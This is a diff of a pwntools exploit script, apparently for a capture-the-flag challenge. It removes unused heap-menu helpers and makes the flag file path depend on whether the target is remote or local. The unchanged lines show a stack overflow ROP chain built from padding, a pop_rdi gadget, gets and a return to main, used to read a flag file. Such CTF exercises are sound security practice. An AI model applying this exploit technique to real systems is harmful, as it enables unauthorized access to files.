@@ -35,30 +35,8 @@ def start(binary):
     else:
         return process(binary)
 
-def create(p, size, value):
-    ru(p,b"")
-    sl(p,b"%i" % size)
-    ru(p,b"")
-    sl(value)
 
-def edit(p, index, value):
-    ru(p,b"")
-    sl(p,"%i" % index)
-    ru(p,b"")
-    sl(p,value)
-
-def delete(p, index):
-    ru(p,b"")
-    sl(p,"%i" % index)
-
-def view(p, index):
-    ru(p,b"")
-    sl(p,"%i" % index)
-    ru(p,b"")
-    return rl(p)
-    
-
-def exploit(p,e,r):
+def exploit(p,e,r,file_path):
 
     pad = b"A" * 16
 
@@ -87,9 +65,8 @@ def exploit(p,e,r):
 
     chain = pop_rdi + writeable_addr
     chain += gets + main
-    
-    file_path = b"/home/ctf/flag.txt"
-    #file_path = b"./flag.txt"
+
+
 
     p.sendline(pad+chain)
     p.sendline(file_path)
@@ -121,6 +98,12 @@ if __name__=="__main__":
     p = start(file)
     e = context.binary = ELF(file)
     r = ROP(e)
+
+    if args.REMOTE:
+        file_path = b"/home/ctf/flag.txt"
+    else: 
+        file_path = b"./flag.txt"
+
     #l = ELF("./libc.so.6")
 
-    exploit(p,e,r)
+    exploit(p,e,r,file_path)
